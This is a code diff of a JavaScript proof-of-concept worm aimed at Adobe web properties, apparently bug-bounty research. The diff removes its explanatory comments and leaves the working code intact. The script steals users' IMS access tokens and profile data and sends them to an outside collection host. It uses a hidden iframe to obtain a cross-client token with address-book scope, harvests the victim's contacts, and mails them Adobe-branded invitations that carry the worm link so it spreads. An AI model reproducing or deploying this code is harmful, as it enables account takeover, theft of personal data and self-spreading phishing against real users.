@@ -1,26 +1,5 @@
-/**
- * Zero-Click ATO Worm — r00tdaddy
- * Confirmed 2026-06-05
- *
- * Two-stage self-propagating worm via chained Adobe vulnerabilities:
- *
- * STAGE 1 (this file, runs on www.adobe.com via maslibs XSS):
- *   - Exfiltrate IMS access_token (zero-click via prompt=none)
- *   - Exfiltrate full user profile (name, email)
- *   - Set x-asset-public-path cookie on .adobe.com → webpack hijack
- *   - Redirect to Express → triggers Stage 2
- *
- * STAGE 2 (runs on new.express.adobe.com via webpack chunk hijack):
- *   - Gets projectx_webapp token (has ab.manage scope)
- *   - Enumerate victim's address book contacts
- *   - Find/create a CC document URN
- *   - Send Adobe-branded invitation emails to all contacts
- *     with targetUrl = this maslibs worm URL
- *   - Victims click Adobe email → land on www.adobe.com → repeat
- */
-
 const EXFIL    = 'https://nboyhu0n.instances.poc.jchunt.top/steal';
-const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--v13';
+const WORM_URL = 'https://www.adobe.com/products/catalog.html?maslibs=cdn.jsdelivr.net/gh/rootd4ddy/mas@main--mas--aem';
 const AB_HOST  = 'https://ab.adobe-identity.com';
 const INV_HOST = 'https://invitations.adobe.io';
 const API_KEY_AB  = 'CCHomeWeb1';
@@ -42,10 +21,6 @@ function decodeJWT(token) {
   } catch { return {}; }
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// STAGE 1: Runs on www.adobe.com (maslibs XSS)
-// Token scope: adobedotcom-cc (AdobeID,openid,gnav,pps.read,firefly_api,...)
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async function stage1() {
   const token = await waitForIMS(8000);
   if (!token) return;
@@ -53,7 +28,6 @@ async function stage1() {
   const payload = decodeJWT(token);
   navigator.sendBeacon(`${EXFIL}?src=token&client=${payload.client_id}`, token);
 
-  // Exfil full profile (name + email)
   try {
     const p = await fetch('https://ims-na1.adobelogin.com/ims/profile/v1?client_id=adobedotcom-cc', {
       headers: { 'Authorization': `Bearer ${token}` }
@@ -61,108 +35,61 @@ async function stage1() {
     navigator.sendBeacon(`${EXFIL}?src=profile`, JSON.stringify(p));
   } catch {}
 
-  // If we already have ab.manage scope, run worm directly
   if (payload.scope?.includes('ab.manage')) {
-    navigator.sendBeacon(`${EXFIL}?src=stage`, 'direct_worm_ab_manage');
     await wormSpread(token);
     return;
   }
 
-  // Cross-client token theft: get CCHomeWeb1 token with ab.manage scope via hidden iframe
-  // IMS prompt=none redirects iframe back to www.adobe.com (same-origin), IMS lib initializes,
-  // then we read the token via iframe.contentWindow.adobeIMS.getAccessToken()
-  navigator.sendBeacon(`${EXFIL}?src=stage`, 'cross_client_iframe');
   try {
     const ccToken = await new Promise((resolve, reject) => {
       const iframe = document.createElement('iframe');
       iframe.style.cssText = 'position:absolute;width:0;height:0;border:0;opacity:0;pointer-events:none';
-      const imsUrl = 'https://ims-na1.adobelogin.com/ims/authorize/v2'
-        + '?client_id=CCHomeWeb1'
-        + '&response_type=token'
-        + '&prompt=none'
+      iframe.src = 'https://ims-na1.adobelogin.com/ims/authorize/v2'
+        + '?client_id=CCHomeWeb1&response_type=token&prompt=none'
         + '&redirect_uri=' + encodeURIComponent('https://www.adobe.com/')
         + '&scope=AdobeID,ab.manage,creative_sdk,openid';
-      iframe.src = imsUrl;
-      const timeout = setTimeout(() => { reject('timeout'); }, 15000);
-      // Poll for iframe's IMS to initialize after redirect back to www.adobe.com
+      const timeout = setTimeout(() => reject('timeout'), 15000);
       const poll = setInterval(() => {
         try {
-          const imsToken = iframe.contentWindow?.adobeIMS?.getAccessToken?.();
-          if (imsToken?.token) {
-            clearInterval(poll);
-            clearTimeout(timeout);
-            resolve(imsToken.token);
-          }
-        } catch (e) { /* cross-origin until redirect completes */ }
+          const t = iframe.contentWindow?.adobeIMS?.getAccessToken?.();
+          if (t?.token) { clearInterval(poll); clearTimeout(timeout); resolve(t.token); }
+        } catch {}
       }, 500);
       document.body.appendChild(iframe);
     });
-
-    const ccPayload = decodeJWT(ccToken);
-    navigator.sendBeacon(`${EXFIL}?src=cc_token&client=${ccPayload.client_id}`, ccToken);
+    navigator.sendBeacon(`${EXFIL}?src=cc_token`, ccToken);
     await wormSpread(ccToken);
-  } catch (e) {
-    navigator.sendBeacon(`${EXFIL}?src=debug`, 'iframe_token_fail_' + e);
-  }
+  } catch {}
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// STAGE 2 / WORM SPREAD: Requires token with ab.manage scope
-// Enumerates contacts → creates/finds document → sends invitations
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async function wormSpread(token) {
-  // Phase A: Enumerate address book contacts
   let emails = [];
   try {
     const abResp = await fetch(`${AB_HOST}/api/address-books?limit=50`, {
       headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB }
     });
     if (abResp.ok) {
-      const abData = await abResp.json();
-      const books = abData?._embedded?.addressBooks || [];
+      const books = (await abResp.json())?._embedded?.addressBooks || [];
       for (const book of books) {
-        const cResp = await fetch(
-          `${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`,
-          { headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB } }
-        );
+        const cResp = await fetch(`${AB_HOST}/api/address-books/${book.ident}/contacts?limit=100`, {
+          headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Key': API_KEY_AB }
+        });
         if (cResp.ok) {
-          const contacts = await cResp.json().catch(() => ({}));
-          const list = contacts?._embedded?.contacts || [];
-          for (const c of list) {
-            if (c?.email) emails.push(c.email);
-          }
+          const contacts = (await cResp.json())?._embedded?.contacts || [];
+          for (const c of contacts) if (c?.email) emails.push(c.email);
         }
       }
     }
   } catch {}
 
   navigator.sendBeacon(`${EXFIL}?src=contacts`, JSON.stringify(emails));
-  if (!emails.length) {
-    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_contacts_found');
-    return;
-  }
+  if (!emails.length) return;
 
-  // Phase B: Use pre-created Express document URN for invitation sharing.
-  // Express documents (application/vnd.adobe.hz.express+dcx) make the email template
-  // respect targetUrl in the email link. The DAS API to create these is on
-  // new.express.adobe.com (CORS-blocked from www.adobe.com), so a real attacker
-  // creates the document server-side using the stolen token, then shares it here.
-  // For PoC, the Express doc is pre-created via:
-  //   POST https://new.express.adobe.com/service/das/documents/
-  //   {"requestType":"createFromDocModel","docSpec":{"repo:name":"x.express","mimetype":"application/vnd.adobe.hz.express+dcx"},"docMetadata":{"docModelVersion":445},"respondWith":"metadata","docModel":"..."}
-  let urn = 'urn:aaid:sc:US:24036637-d046-440d-add7-ce257ffa78ff';
+  const urn = 'urn:aaid:sc:US:15fee5cd-d42e-4e13-88e1-9832f2bdafd9';
 
-  if (!urn) {
-    navigator.sendBeacon(`${EXFIL}?src=debug`, 'no_urn_found');
-    return;
-  }
-
-  navigator.sendBeacon(`${EXFIL}?src=urn`, urn);
-
-  // Phase C: Send Adobe-branded invitations to all contacts
   for (const email of emails.slice(0, 50)) {
     try {
-      const invResp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
+      const resp = await fetch(`${INV_HOST}/api/v4/share/${encodeURIComponent(urn)}?mode=direct_acl`, {
         method: 'POST',
         headers: {
           'Authorization': `Bearer ${token}`,
@@ -178,15 +105,9 @@ async function wormSpread(token) {
           configuration: {}
         })
       });
-      const result = await invResp.text().catch(() => '');
-      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, result);
+      navigator.sendBeacon(`${EXFIL}?src=inv&to=${encodeURIComponent(email)}`, await resp.text());
     } catch {}
   }
-
-  navigator.sendBeacon(`${EXFIL}?src=worm_complete`, `sent_to_${emails.length}_contacts`);
 }
 
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// ENTRY: Detect which stage we're in and execute
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 stage1();
